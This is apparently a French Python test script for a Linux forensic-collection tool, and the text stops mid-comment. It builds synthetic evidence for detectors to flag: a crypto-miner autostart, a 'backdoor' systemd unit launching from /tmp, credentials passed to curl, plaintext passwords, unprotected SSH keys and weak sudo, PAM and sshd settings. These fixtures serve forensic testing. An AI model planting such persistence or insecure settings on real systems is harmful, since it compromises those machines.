#!/usr/bin/env python3
"""Une collecte qui porte TOUS les artefacts, et la preuve qu'on en tire quelque chose.

    python3 tests/artefacts.py [dossier de travail]

Fabrique une collecte synthétique où chaque pièce que `collecte-linux.conf`
sait prendre est présente — et piégée : un film copié sur une clé USB, un
marque-page vers un site de torrent, une recherche tapée dans la barre
d'adresse, un mineur en autostart, une unité systemd qui lance depuis /tmp,
une clé SSH commune à deux comptes, un compte qui prend l'identité d'un
autre. Puis elle lance les deux extracteurs et VÉRIFIE que chaque artefact a
produit le fait ou le constat qu'on en attend.

C'est le filet de la couverture : `tests/matrice.py` répond « les cinq
familles de distributions passent-elles ? », celui-ci répond « chaque pièce
collectée sert-elle à quelque chose ? ». Ajouter une pièce à la collecte sans
l'ajouter ici, c'est ne pas la tester.

Sort 0 si tout est trouvé, 1 sinon, en disant ce qui manque.
"""
import bz2, calendar, functools, gzip, hashlib, io, json, os, re, shutil, sqlite3
import subprocess
import zipfile
import sys, tarfile, tempfile, time

ICI = os.path.dirname(os.path.abspath(__file__))
SKILLS = os.path.dirname(ICI)
sys.path.insert(0, os.path.join(SKILLS, "forensic-linux", "scripts"))
import extraire                                                        # noqa: E402
from extraire import UTMP                                              # noqa: E402

P = "PC42_B12_ARTE_ubuntu"
US = 1_000_000
EPOCH_1601 = 11_644_473_600


def epoch(iso):
    return calendar.timegm(time.strptime(iso, "%Y-%m-%dT%H:%M:%S"))


def ff(iso):                       # Firefox, wtmpdb : microsecondes depuis 1970
    return epoch(iso) * US


def ch(iso):                       # Chrome : microsecondes depuis 1601
    return (epoch(iso) + EPOCH_1601) * US


def sqlite_blob(schema, rows):
    with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as t:
        nom = t.name
    cx = sqlite3.connect(nom)
    for sql in schema:
        cx.execute(sql)
    for sql, r in rows:
        cx.executemany(sql, r)
    cx.commit()
    cx.close()
    blob = open(nom, "rb").read()
    os.unlink(nom)
    return blob


def utmp(entrees):
    """wtmp binaire : type, pid, tty, compte, origine, date."""
    return b"".join(
        UTMP.pack(typ, pid, tty.encode().ljust(32, b"\0"), tty[-4:].encode().ljust(4, b"\0"),
                  qui.encode().ljust(32, b"\0"), ou.encode().ljust(256, b"\0"),
                  0, 0, 0, epoch(iso), 0, b"\0" * 16, b"\0" * 20)
        for typ, pid, tty, qui, ou, iso in entrees)


def batir(base):
    R = os.path.join(base, P)
    for d in ("SYSTEME", "COMPTES", "PAQUETS", "RESEAU", "JOURNAUX", "CONNEXIONS",
              "PERSISTANCE", "TIMELINE", "MACHINES", "PHOTOREC/recup_1", "STRINGS",
              "SUPPRIMES/racine", "PLASO"):
        os.makedirs(os.path.join(R, d), exist_ok=True)

    def w(rel, contenu):
        with open(os.path.join(R, rel), "wb") as fh:
            fh.write(contenu.encode("utf-8") if isinstance(contenu, str) else contenu)

    def T(rel, membres):
        """Un membre dont le contenu est un tuple ("lien", cible) est un LIEN
        symbolique : c'est ce que /etc/apparmor.d/disable/ contient, et rien
        d'autre — un test qui y mettrait un fichier ne testerait rien."""
        with tarfile.open(os.path.join(R, rel), "w:gz") as t:
            for nom, blob in membres.items():
                i = tarfile.TarInfo("./" + nom)
                i.mtime = epoch("2026-01-08T12:00:00")
                if isinstance(blob, tuple):
                    i.type, i.linkname, i.size = tarfile.SYMTYPE, blob[1], 0
                    t.addfile(i)
                    continue
                blob = blob.encode("utf-8") if isinstance(blob, str) else blob
                i.size = len(blob)
                t.addfile(i, io.BytesIO(blob))

    # ── le système ────────────────────────────────────────────────────
    w("SYSTEME/hostname", "pc42\n")
    w("SYSTEME/os-release", 'ID=ubuntu\nID_LIKE=debian\nVERSION_ID="24.04"\n'
                            'PRETTY_NAME="Ubuntu 24.04.1 LTS"\n')
    w(f"SYSTEME/{P}_localtime.txt", "Europe/Paris\n")
    w("SYSTEME/fstab", "UUID=aaaa / ext4 defaults 0 1\n"
                       "//serveur/partage /mnt/partage cifs credentials=/root/.smb 0 0\n"
                       "/dev/mapper/coffre /coffre ext4 defaults 0 2\n")
    T(f"SYSTEME/{P}_installation.tar.gz", {
        "etc/machine-id": "9f1c3a2b4d5e6f708192a3b4c5d6e7f8\n",
        "etc/adjtime": "0.0 0 0.0\n0\nUTC\n",
        "root/anaconda-ks.cfg": "network --hostname=pc42.entreprise.fr\n"
                                "timezone Europe/Paris\nrootpw --iscrypted $6$x\n"
                                "user --name=jdupont --groups=wheel\n"})
    w(f"MACHINES/{P}_disques_virtuels.txt", "/home/jdupont/VM/kali.qcow2\n")

    # ── les paquets ───────────────────────────────────────────────────
    w(f"PAQUETS/{P}_paquets.txt",
      "||/ Nom Version Architecture Description\n+++-===\n"
      "ii  firefox 134.0 amd64 navigateur\n"
      "ii  qbittorrent 5.0.3 amd64 torrent\n")
    T(f"PAQUETS/{P}_historique.tar.gz", {
        "var/log/dpkg.log": "2025-06-01 08:00:00 install base-files:amd64 <none> 13.1\n"
                            "2026-01-04 18:30:00 install qbittorrent:amd64 <none> 5.0.3\n",
        "var/log/apt/history.log": "Start-Date: 2026-01-04  18:29:58\n"
                                   "Commandline: apt install qbittorrent\nEnd-Date: 2026-01-04  18:30:05\n"})

    # ── les comptes, leurs droits, leur PAM ───────────────────────────
    w(f"COMPTES/{P}_passwd.txt",
      "root:x:0:0:root:/root:/bin/bash\n"
      "jdupont:x:1000:1000:Jean Dupont:/home/jdupont:/bin/bash\n"
      "mrobert:x:1001:1001:M Robert:/home/mrobert:/bin/bash\n")
    T(f"COMPTES/{P}_droits.tar.gz", {
        "etc/shadow": "root:$6$a$b:19000:0:99999:7:::\njdupont:$1$c$d:19800:0:99999:7:::\n",
        "etc/sudoers": "%wheel ALL=(ALL) NOPASSWD: ALL\n",
        "etc/login.defs": "PASS_MAX_DAYS\t99999\n",
        "etc/pam.d/common-auth": "auth [success=1 default=ignore] pam_unix.so nullok\n",
        "etc/pam.d/common-password":
            "# minlen ici serait un commentaire, pas une règle\n"
            "password requisite pam_pwquality.so retry=3 minlen=6 difok=2\n"
            "password [success=1 default=ignore] pam_unix.so obscure yescrypt\n",
        "etc/apparmor.d/disable/usr.bin.firefox": ("lien", "/etc/apparmor.d/usr.bin.firefox")})
    w(f"COMPTES/{P}_jdupont_stat.txt",
      "  File: /mnt/i/home/jdupont\n  Size: 4096\nModify: 2026-01-06 22:31:00.000000000 +0100\n"
      " Birth: 2025-06-01 09:12:00.000000000 +0200\n")
    w(f"COMPTES/{P}_jdupont_inventaire.txt",
      "/mnt/i/home/jdupont:\ntotal 20\n"
      "drwxr-xr-x 8 jdupont jdupont 4096 janv.  6 22:31 .\n"
      "-rw------- 1 jdupont jdupont  812 janv.  4 10:22 .bash_history\n"
      "-rw-r--r-- 1 mrobert mrobert  512 janv.  5 11:02 note-de-mrobert.odt\n"
      "-rw-r--r-- 1 jdupont jdupont 3174 nov.  30 18:40 Le.Film.2024.VOSTFR.torrent\n"
      "\n/mnt/i/home/jdupont/Vidéos/Films:\ntotal 8\n"
      "-rw-r--r-- 1 jdupont jdupont 2147483648 déc.  24 22:05 Le.Film.2024.1080p.mkv\n")
    w(f"COMPTES/{P}_mrobert_inventaire.txt",
      "/mnt/i/home/mrobert:\ntotal 4\n"
      "-rw-r--r-- 1 mrobert mrobert 4096 janv.  3 17:12 rapport-2026.odt\n")

    cle = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPARTAGEEPARTAGEEPARTAGEEPARTAGEE0 "
           "cle-commune\n")
    # Firefox : historique, cookies, marque-pages, formulaires, mots de passe
    places = sqlite_blob(
        ["CREATE TABLE moz_places(id INTEGER PRIMARY KEY, url TEXT, title TEXT, "
         "visit_count INTEGER, last_visit_date INTEGER)",
         "CREATE TABLE moz_historyvisits(id INTEGER PRIMARY KEY, place_id INTEGER, visit_date INTEGER)",
         "CREATE TABLE moz_annos(id INTEGER PRIMARY KEY, place_id INTEGER, content TEXT, dateAdded INTEGER)",
         "CREATE TABLE moz_bookmarks(id INTEGER PRIMARY KEY, type INTEGER, fk INTEGER, "
         "title TEXT, dateAdded INTEGER)"],
        [("INSERT INTO moz_places VALUES(?,?,?,?,?)", [
            (1, "https://www.yggtorrent.wtf/torrent/999", "Le.Film.2024", 1, ff("2025-11-30T18:38:00")),
            (2, "https://intranet.entreprise.fr/rh", "RH", 40, ff("2026-01-05T09:00:00")),
            # Une longue traîne de pages ANCIENNES. Une borne, quelle qu'elle
            # soit, garde les plus récentes et jette celles-ci — c'est-à-dire
            # exactement ce qu'on ne retrouve nulle part ailleurs quand
            # l'historique récent a été vidé. Le test les compte toutes.
            *((i, f"https://vieux-site-{i:03d}.example/page", f"Page {i}", 1,
               ff("2025-01-%02dT08:00:00" % (i % 28 + 1))) for i in range(3, 23))]),
         ("INSERT INTO moz_historyvisits VALUES(?,?,?)", [
            (1, 1, ff("2025-11-30T18:38:00")), (2, 2, ff("2025-06-01T09:00:00"))]),
         ("INSERT INTO moz_annos VALUES(?,?,?,?)", [
            (1, 1, "file:///home/jdupont/Téléchargements/Le.Film.2024.VOSTFR.torrent",
             ff("2025-11-30T18:40:00"))]),
         ("INSERT INTO moz_bookmarks VALUES(?,?,?,?,?)", [
            (1, 1, 1, "Le film", ff("2025-11-30T18:35:00"))])])
    T(f"COMPTES/{P}_jdupont_profils.tar.gz", {
        ".mozilla/firefox/ab.default/places.sqlite": places,
        ".mozilla/firefox/ab.default/cookies.sqlite": sqlite_blob(
            ["CREATE TABLE moz_cookies(id INTEGER PRIMARY KEY, host TEXT, name TEXT, "
             "value TEXT, creationTime INTEGER, lastAccessed INTEGER)"],
            [("INSERT INTO moz_cookies VALUES(?,?,?,?,?,?)", [
                (1, ".netflix.com", "sid", "NE-PAS-LIRE",
                 ff("2025-10-10T21:00:00"), ff("2025-12-24T22:00:00"))])]),
        ".mozilla/firefox/ab.default/formhistory.sqlite": sqlite_blob(
            ["CREATE TABLE moz_formhistory(id INTEGER PRIMARY KEY, fieldname TEXT, value TEXT, "
             "timesUsed INTEGER, firstUsed INTEGER, lastUsed INTEGER)"],
            [("INSERT INTO moz_formhistory VALUES(?,?,?,?,?,?)", [
                (1, "q", "telecharger film gratuit", 3,
                 ff("2025-11-29T20:00:00"), ff("2025-11-30T18:30:00"))])]),
        ".mozilla/firefox/ab.default/logins.json": json.dumps({"logins": [
            {"hostname": "https://www.leboncoin.fr", "encryptedUsername": "x",
             "encryptedPassword": "y", "timeCreated": epoch("2025-12-02T13:06:00") * 1000,
             "timeLastUsed": epoch("2025-12-02T13:06:00") * 1000}]}),
        ".thunderbird/ab.default/prefs.js":
            'user_pref("mail.identity.id1.useremail", "jean.dupont@entreprise.fr");\n'
            'user_pref("mail.identity.id2.useremail", "jdupont1987@gmail.com");\n'
            'user_pref("mail.server.server2.hostname", "imap.gmail.com");\n',
        ".local/share/recently-used.xbel":
            '<bookmark href="file:///home/jdupont/V%C3%AD/Le.Film.2024.1080p.mkv" '
            'added="2025-12-24T22:06:00Z" modified="2025-12-24T22:06:00Z"/>',
        "snap/spotify/current/x": "x",
        ".var/app/com.valvesoftware.Steam/config/y": "y"})
    T(f"COMPTES/{P}_jdupont_artefacts.tar.gz", {
        ".bash_history": "ls -l\ncurl -u admin:Secr3t! https://intranet\n"
                         "#1767105600\nqbittorrent-nox -d\nsudo -u mrobert bash\n",
        ".ssh/authorized_keys": cle,
        ".ssh/id_ed25519": "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                           + "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZQ==\n"
                           + "-----END OPENSSH PRIVATE KEY-----\n",
        ".config/autostart/mineur.desktop":
            "[Desktop Entry]\nType=Application\nExec=/home/jdupont/.cache/xmrig -o pool:3333\n",
        ".config/google-chrome/Default/History": sqlite_blob(
            ["CREATE TABLE urls(id INTEGER PRIMARY KEY, url TEXT, title TEXT, "
             "visit_count INTEGER, last_visit_time INTEGER)",
             "CREATE TABLE visits(id INTEGER PRIMARY KEY, url INTEGER, visit_time INTEGER)",
             "CREATE TABLE downloads(id INTEGER PRIMARY KEY, target_path TEXT, tab_url TEXT, "
             "start_time INTEGER)",
             "CREATE TABLE keyword_search_terms(keyword_id INTEGER, url_id INTEGER, term TEXT)"],
            [("INSERT INTO urls VALUES(?,?,?,?,?)", [
                (1, "https://papystreaming.example/film", "Film", 1, ch("2025-12-24T21:30:00"))]),
             ("INSERT INTO visits VALUES(?,?,?)", [(1, 1, ch("2025-12-24T21:30:00"))]),
             ("INSERT INTO downloads VALUES(?,?,?,?)", [
                (1, "/home/jdupont/Téléchargements/rustdesk-1.2.3.deb",
                 "https://rustdesk.com/", ch("2025-11-30T18:44:00"))]),
             ("INSERT INTO keyword_search_terms VALUES(?,?,?)",
              [(1, 1, "streaming film complet vf")])]),
        ".config/google-chrome/Default/Bookmarks": json.dumps({"roots": {"bookmark_bar": {
            "children": [{"type": "url", "name": "Papystreaming",
                          "url": "https://papystreaming.example/",
                          "date_added": str(ch("2025-12-24T21:00:00"))}]}}}),
        ".config/google-chrome/Default/Web Data": sqlite_blob(
            ["CREATE TABLE autofill(name TEXT, value TEXT, count INTEGER, "
             "date_created INTEGER, date_last_used INTEGER)"],
            [("INSERT INTO autofill VALUES(?,?,?,?,?)", [
                ("email", "jdupont1987@gmail.com", 4,
                 epoch("2025-10-20T12:00:00"), epoch("2026-01-03T08:00:00"))])])})
    T(f"COMPTES/{P}_mrobert_artefacts.tar.gz",
      {".bash_history": "make -j8\ngit push\n", ".ssh/authorized_keys": cle})
    T(f"COMPTES/{P}_mrobert_profils.tar.gz", {".mozilla/firefox/zz.default/places.sqlite":
                                              b"SQLite format 3\x00https://intranet.entreprise.fr/\x00"})

    # ── sessions, journal, réseau, persistance ────────────────────────
    w("CONNEXIONS/wtmp", utmp([
        (2, 0, "~", "reboot", "6.8.0", "2026-01-05T07:00:00"),
        (7, 1001, "tty2", "jdupont", "", "2026-01-05T07:12:00"),
        (7, 1002, "pts/0", "mrobert", "10.1.2.3", "2026-01-05T09:00:00"),
        (8, 1002, "pts/0", "", "", "2026-01-05T09:30:00"),
        (8, 1001, "tty2", "", "", "2026-01-05T16:00:00"),
        (7, 1003, "pts/1", "jdupont", "192.168.1.50", "2026-01-06T21:31:00")]))
    w(f"JOURNAUX/{P}_journal.txt",
      "2026-01-05T10:15:03+0100 pc42 sudo[42]: mrobert : TTY=pts/0 ; PWD=/ ; USER=root ; "
      "COMMAND=/usr/bin/apt install qbittorrent\n"
      "2026-01-05T11:40:10+0100 pc42 kernel: usb 1-2: New USB device found, idVendor=0781, idProduct=5583\n"
      "2026-01-05T11:40:10+0100 pc42 kernel: usb 1-2: SerialNumber: 4C530001230405112233\n"
      "2026-01-05T11:40:12+0100 pc42 udisksd[900]: Mounted /dev/sdb1 at "
      "/run/media/jdupont/SANDISK32 on behalf of uid 1000\n"
      "2026-01-05T18:40:00+0100 pc42 su: pam_unix(su:session): session opened for user "
      "mrobert(uid=1001) by jdupont(uid=1000)\n")
    # Le journal TOURNÉ, comprimé, RANGÉ DANS LE TAR : c'est la forme la plus
    # courante de tout /var/log, et le seul endroit où vit la chaîne ci-dessous.
    # Si les membres d'archive ne sont pas décomprimés avant d'être soumis aux
    # motifs, elle ressort « ABSENTE » — le pire mensonge que l'outil puisse
    # faire — alors qu'elle est là.
    T(f"JOURNAUX/{P}_var_log.tar.gz", {
        "var/log/auth.log":
            "Jan  5 09:00:01 pc42 sshd[7]: Accepted publickey for "
            "mrobert from 10.1.2.3 port 5000 ssh2\n"
            # Cette ligne-ci est l'épreuve du FUSEAU. Son heure est celle du
            # POSTE (Europe/Paris) ; le mtime du membre, lui, est en UTC et
            # vaut 12:00. 13:30 locale « dépasse » donc 12:00 UTC, l'année
            # courante était rejetée, et la ligne ressortait datée de l'année
            # PRÉCÉDENTE — sur les lignes les plus récentes du journal, celles
            # qui intéressent l'enquête.
            "Jan  8 13:30:00 pc42 sshd[9]: Accepted password for "
            "jdupont from 10.1.2.9 port 5001 ssh2\n",
        "var/log/auth.log.2.gz": gzip.compress(
            b"Jan  2 08:14:55 pc42 sudo: jdupont : "
            b"COMMAND=/usr/bin/journal-tourne-et-comprime-dans-le-tar\n")})
    T(f"RESEAU/{P}_reseau.tar.gz", {
        "etc/NetworkManager/system-connections/Bureau.nmconnection":
            "[connection]\nid=Bureau\nuuid=11111111-1111-1111-1111-111111111111\ntype=wifi\n"
            "\n[wifi]\nssid=ENTREPRISE-CORP\nmac-address=DC:A6:32:1B:4E:07\n",
        "etc/NetworkManager/system-connections/McDo.nmconnection":
            "[connection]\nid=McDonalds Free WiFi\n"
            "uuid=22222222-2222-2222-2222-222222222222\ntype=wifi\n"
            "permissions=user:jdupont:;\n\n[wifi]\nssid=McDonalds Free WiFi\n"
            # bit « administré localement » posé : une adresse tirée au hasard,
            # ce que fait un portable pour le Wi-Fi. La synthèse doit le DIRE,
            # sinon on croit suivre une machine alors qu'on suit un tirage.
            "cloned-mac-address=B2:7A:11:C0:FF:EE\n",
        "var/lib/NetworkManager/timestamps":
            "[timestamps]\n22222222-2222-2222-2222-222222222222=1766000000\n",
        "etc/wpa_supplicant/wpa_supplicant.conf": 'network={\n    ssid="ibis-hotel"\n}\n',
        "var/lib/iwd/=4d63446f20465220576946692e.psk": "[Security]\nPassphrase=x\n",
        "etc/ssh/sshd_config": "PermitRootLogin yes\nPasswordAuthentication yes\n",
        "etc/hosts": "127.0.0.1 localhost\n10.0.0.9 depot-interne\n",
        "etc/resolv.conf": "nameserver 10.0.0.1\nsearch entreprise.local\n"})
    T(f"PERSISTANCE/{P}_persistance.tar.gz", {
        "etc/crontab": "0 3 * * * root /usr/bin/updatedb\n",
        "etc/systemd/system/collecte.service":
            "[Unit]\nDescription=collecte\n[Service]\nExecStart=/opt/outil/collecte --daemon\n",
        "etc/systemd/system/backdoor.service":
            "[Unit]\nDescription=maj\n[Service]\nExecStart=/tmp/.maj/agent\n",
        "usr/lib/systemd/system/cups.service": "[Service]\nExecStart=/usr/sbin/cupsd -l\n",
        "etc/xdg/autostart/verif.desktop": "[Desktop Entry]\nExec=/usr/bin/verif-maj\n",
        "etc/systemd/system/multi-user.target.wants/x.service":
            "[Service]\nExecStartPre=/opt/outil/prepare\nExecStart=/opt/outil/x\n",
        "usr/lib/systemd/system/deux-exec.service":
            "[Service]\nExecStartPre=/usr/bin/mkdir -p /run/x\nExecStart=/usr/sbin/x\n",
        "etc/udev/rules.d/99-usb.rules":
            '# exemple : RUN+="/bin/faux"\n'
            'ACTION=="add", SUBSYSTEM=="usb", RUN+="/usr/local/bin/note-usb.sh"\n'
            'ACTION=="add", SUBSYSTEM=="block", RUN{builtin}+="kmod load x"\n'})

    # ── la timeline, en ISO, dans le fuseau qu'on note à côté ─────────
    w(f"TIMELINE/{P}_fuseau_timeline.txt", "UTC\n")
    lignes = ["Date,Size,Type,Mode,UID,GID,Meta,File Name"]

    def tl(d, taille, genre, inode, chemin):
        lignes.append(f'{d},{taille},{genre},r/rrw-r--r--,1000,1000,{inode},"{chemin}"')

    for i in range(500):                                   # du bruit, comme une vraie
        tl(f"2025-12-{i % 28 + 1:02d}T0{i % 9}:00:00", 900, "m...", 100000 + i,
           f"/usr/share/doc/paquet{i}/README")
    tl("2025-11-30T18:40:02", 31742, "macb", 262146,
       "/home/jdupont/Téléchargements/Le.Film.2024.VOSTFR.torrent")
    tl("2025-11-30T18:44:12", 1048576, "macb", 262145,
       "/home/jdupont/Téléchargements/rustdesk-1.2.3.deb")
    tl("2025-12-24T22:05:00", 2147483648, "macb", 393217,
       "/home/jdupont/Vidéos/Films/Le.Film.2024.1080p.mkv")
    tl("2026-01-05T10:41:03", 2147483648, "...b", 8193,
       "/run/media/jdupont/SANDISK32/Le.Film.2024.1080p.mkv")
    tl("2026-01-05T10:42:10", 512, ".a..", 8194,
       "/run/media/jdupont/SANDISK32/procedure-interne.pdf")
    tl("2026-01-04T10:22:31", 812, "m.c.", 131074, "/home/jdupont/.bash_history")
    w(f"TIMELINE/{P}_mactime.csv", "\n".join(lignes) + "\n")

    # ── ce que photorec a rendu ───────────────────────────────────────
    # Deux pièces LISIBLES parmi le remplissage : c'est tout l'enjeu, un
    # fichier récupéré sans nom ni date reste du contenu, et l'outil doit
    # regarder dedans. La clé privée et le mot de passe en clair ne sont
    # nulle part ailleurs dans la collecte.
    for nom, taille in (("f0001.pdf", 50000), ("f0003.jpg", 800000),
                        ("f0004.kdbx", 4000), ("f0005.zip", 90000), ("f0006", 1000)):
        w(f"PHOTOREC/recup_1/{nom}", b"x" * taille)
    w("PHOTOREC/recup_1/f0002.txt",
      "notes de reprise\n"
      "-----BEGIN OPENSSH PRIVATE KEY-----\n"
      "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz\n"
      "-----END OPENSSH PRIVATE KEY-----\n")
    w("PHOTOREC/recup_1/f0007.txt",
      "# brouillon de configuration retrouve dans l'espace libre\n"
      "smtp_host = smtp.entreprise.fr\n"
      "password = Bienvenue2025!\n")
    # Un .docx récupéré : un zip de XML. Sans décompression, les motifs n'y
    # voient RIEN alors que le texte est là — et c'est le cas le plus courant
    # de tout PHOTOREC, celui d'un document de bureautique.
    tampon = io.BytesIO()
    with zipfile.ZipFile(tampon, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("word/document.xml",
                   "<w:t>Compte rendu</w:t>"
                   "<w:t>acces admin : password = SecretDansUnDocx!</w:t>")
    w("PHOTOREC/recup_1/f0008.docx", tampon.getvalue())
    # SUPPRIMES ne vient que de xfs_undelete, donc que d'un volume xfs : le
    # chemin existe dans le code depuis le début mais n'était jamais exercé.
    # Le nom que rend xfs_undelete porte la date de suppression et l'inode.
    w("SUPPRIMES/racine/2026-01-04_10-22-31_131074.txt",
      "Objet : reunion du 4 janvier\n"
      "Cordialement, jdupont@entreprise.fr\n"
      "acces au partage : //serveur/partage\n")

    # ── STRINGS : les chaînes des périphériques, deux volumes ─────────
    # DEUX volumes, sinon rien ne prouve que la collecte n'oublie pas le /home
    # monté à part — c'est exactement la garantie à tenir. Et le fichier brut
    # porte une chaîne qu'AUCUNE autre pièce ne contient : c'est le seul moyen
    # de vérifier qu'il est vraiment fouillé.
    #
    # Les extraits sont écrits LITTÉRALEMENT, au format que rend la collecte
    # (« compte décalage valeur »). Les dériver en Python reviendrait à
    # réécrire les motifs de la conf : le piège s'accorderait alors avec
    # lui-même quoi qu'il arrive, ce qui est le contraire d'un test.
    for volume, brut, extraits in (
        ("racine",
         ["https://www.yggtorrent.wtf/torrent/999",
          "jdupont1987@gmail.com",
          "10.0.0.9",
          "/home/jdupont/Téléchargements/Le.Film.2024.VOSTFR.torrent",
          "chaine-effacee-que-rien-d-autre-ne-porte",
          "AKIAIOSFODNN7EXAMPLE",
          "e8:9c:25:3f:0a:b1",
          "https://www.yggtorrent.wtf/torrent/999"],
         {"urls": "      2 https://www.yggtorrent.wtf/torrent/999\n",
          "courriels": "      1 jdupont1987@gmail.com\n",
          "ip": "      1 10.0.0.9\n",
          "mac": "      1 e8:9c:25:3f:0a:b1\n",
          "chemins": "      1 /home/jdupont/Téléchargements/Le.Film.2024.VOSTFR.torrent\n"}),
        ("home",
         ["/home/jdupont/Vidéos/Films/Le.Film.2024.1080p.mkv",
          "mrobert@entreprise.fr",
          "192.168.0.5"],
         {"chemins": "      1 /home/jdupont/Vidéos/Films/Le.Film.2024.1080p.mkv\n",
          "courriels": "      1 mrobert@entreprise.fr\n",
          "ip": "      1 192.168.0.5\n"}),
    ):
        # strings NU, non comprimé : ni décalage en tête de ligne, ni .gz.
        w(f"STRINGS/{P}_strings_{volume}.txt", "\n".join(brut) + "\n")
        for genre, contenu in extraits.items():
            w(f"STRINGS/{P}_strings_{volume}_{genre}.txt", contenu)

    # hors de la collecte : un fichier d'indicateurs posé DEDANS se trouverait
    # lui-même, et l'extracteur l'écarte — le test le vérifie en le posant à côté
    with open(os.path.join(base, "indicateurs.txt"), "w", encoding="utf-8") as fh:
        fh.write("# ce que l'on cherche, venu d'ailleurs\n"
                 "texte: McDonalds\nfichier: *.torrent\nip: 203.0.113.42   # jamais vue ici\n"
                 # celle-ci n'existe QUE dans le .gz : si l'extracteur ne
                 # décompresse pas en flux, elle sort « ABSENTE » et le test
                 # tombe. C'est le seul moyen de prouver que le strings du
                 # disque est réellement fouillé.
                 "texte: chaine-effacee-que-rien-d-autre-ne-porte\n"
                 # Cette chaîne est IMBRIQUÉE dans ce que reconnaît un motif de
                 # l'outil (« password = Bienvenue2025! »). Avec une alternation
                 # ordinaire, le motif interne l'avale et elle ressort
                 # « ABSENTE » — on annonce à l'analyste que sa preuve n'existe
                 # pas. C'est le pire faux négatif possible : le test l'interdit.
                 "texte: Bienvenue2025!\n"
                 # Celle-ci n'existe que dans un .gz RANGÉ DANS UN TAR. Le
                 # membre était soumis aux motifs sous sa forme comprimée, où
                 # rien ne peut correspondre : elle sortait « ABSENTE ».
                 "texte: journal-tourne-et-comprime-dans-le-tar\n")
    # Une super-timeline minuscule : sans elle, la catégorie « plaso » n'est pas
    # PRODUITE par la collecte de référence, et le contrôle « toute catégorie
    # atteint le rapport » ne couvre pas la régression qu'il vise.
    w("PLASO/%s_plaso.jsonl" % P, "".join(
        json.dumps({"__container_type__": "event", "data_type": "fs:stat",
                    "parser": "filestat", "timestamp_desc": "mtime",
                    "timestamp": ff("2026-01-06T22:%02d:00" % i),
                    "filename": "/home/jdupont/Documents/note%d.odt" % i}) + "\n"
        for i in range(3)))
    return R


# Ce que chaque artefact DOIT produire. Un fait attendu qui manque, c'est une
# pièce collectée pour rien.
ATTENDUS_FAITS = [
    ("fstab", "montage réseau déclaré"),
    ("kickstart", "compte créé à l'installation"),
    ("machine-id", "machine-id"),
    ("stat du dossier", "création du dossier du compte"),
    ("disque virtuel", "disque de machine virtuelle sur le poste"),
    ("paquets", "paquets installés (nombre)"),
    ("dpkg.log", "installation du système (plus ancienne ligne de dpkg.log)"),
    ("apt history", "commande du gestionnaire de paquets"),
    ("wtmp binaire", "ouverture de session"),
    ("wtmp : fermeture", "fermeture de session"),
    ("journal : sudo", "commande sudo"),
    ("journal : su", "changement d'utilisateur (su)"),
    ("journal : USB", "support amovible USB branché"),
    ("journal : série USB", "numéro de série du support USB"),
    ("journal : montage", "système de fichiers amovible monté"),
    ("auth.log tourné", "connexion SSH acceptée"),
    ("NetworkManager", "réseau sans fil enregistré"),
    ("hosts", "hôte déclaré en dur"),
    ("resolv.conf", "serveur DNS"),
    ("historique Firefox", "page visitée"),
    ("cookies", "domaine ayant posé un cookie"),
    ("téléchargements", "fichier téléchargé"),
    ("marque-pages", "marque-page enregistré"),
    ("formulaires", "saisie dans un formulaire"),
    ("recherches", "recherche saisie dans la barre d'adresse"),
    ("mots de passe enregistrés", "mot de passe enregistré dans le navigateur"),
    ("recently-used", "fichier ouvert récemment"),
    ("snap", "application snap présente chez ce compte"),
    ("flatpak", "application flatpak présente chez ce compte"),
    ("Thunderbird", "adresse de courriel configurée"),
    ("historique shell", "historique daté (HISTTIMEFORMAT posé)"),
    ("clé autorisée", "clé SSH autorisée à ouvrir ce compte"),
    ("autostart du compte", "programme lancé à l'ouverture de session de ce compte"),
    ("cron", "tâche planifiée"),
    ("unité posée à la main", "unité systemd posée par l'administrateur"),
    ("unité anormale", "unité systemd lançant un programme depuis un endroit anormal"),
    ("autostart du système", "programme lancé à l'ouverture de session"),
    ("udev", "règle udev lançant un programme"),
    ("photorec", "pièces récupérées de type « document »"),
    ("timeline : compte", "entrées dans la timeline du système de fichiers"),
    ("timeline : téléchargement", "fichier retrouvé sur le disque"),
    ("timeline : clé USB", "fichier écrit sur un support amovible"),
    ("timeline : lecture", "fichier lu sur un support amovible"),
    ("périodes : borne", "première trace datée de la collecte"),
    ("périodes : trou", "aucune trace pendant une longue période"),
    ("supports : regroupés", "support amovible reconnu"),
    ("chaînes : compte", "chaînes distinctes de type « adresse web »"),
    ("chaînes : url", "adresse web"),
    ("chaînes : courriel", "adresse de courriel"),
    ("chaînes : IP", "adresse IP"),
    ("chaînes : chemin", "chemin personnel"),
    ("chaînes : brut", "chaînes brutes du périphérique"),
    ("indicateur trouvé", "texte recherché présent dans un fichier"),
    ("indicateur absent", "ip recherché ABSENT de la collecte"),
]
ATTENDUS_CONSTATS = [
    ("shadow : MD5", "mot de passe haché en MD5 (algorithme obsolète)"),
    ("sudoers", "élévation sans mot de passe (sudo NOPASSWD)"),
    ("login.defs", "durée de vie des mots de passe très longue"),
    ("PAM : nullok", "PAM accepte un mot de passe vide (nullok)"),
    ("PAM : minlen en argument", "longueur minimale de mot de passe faible"),
    ("PAM : blocage", "aucun blocage du compte après des échecs répétés"),
    ("AppArmor", "profil AppArmor désactivé"),
    ("sshd", "connexion directe en root autorisée par SSH"),
    ("pare-feu", "aucune configuration de pare-feu"),
    ("secret en clair", "identifiant passé à curl"),
    ("clé sans phrase", "clé privée SSH SANS phrase de passe"),
    ("partage : fichiers", "fichiers appartenant à un autre compte dans le dossier personnel"),
    ("partage : su", "prise de l'identité d'un autre compte local (su)"),
    ("partage : historique",
     "prise de l'identité d'un autre compte local depuis l'interpréteur"),
    ("partage : clé commune", "la même clé SSH ouvre plusieurs comptes"),
    ("support amovible", "support amovible monté"),
    ("règle : domaine", "domaine présent dans une base de navigateur"),
    ("règle : fichier", "fichier présent dans le dossier personnel"),
    ("règle : commande", "commande saisie dans l'interpréteur"),
    ("règle : wifi", "réseau sans fil enregistré sur le poste"),
]


# Un libellé ne suffit pas toujours. « domaine présent dans une base de
# navigateur » sort aussi bien de l'historique que d'un cookie ; or le cookie
